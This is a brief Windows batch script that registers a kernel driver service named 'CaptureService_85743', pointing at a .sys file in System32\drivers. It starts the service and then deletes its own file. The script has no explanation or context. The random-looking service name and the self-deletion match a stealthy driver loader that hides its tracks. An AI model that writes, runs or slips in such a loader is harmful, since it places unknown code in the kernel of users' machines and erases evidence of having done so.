@echo off
cd %~dp0
sc create CaptureService_85743 binpath=C:\Windows\System32\drivers\ufx02000.sys type=kernel
sc start CaptureService_85743
del "%~f0"



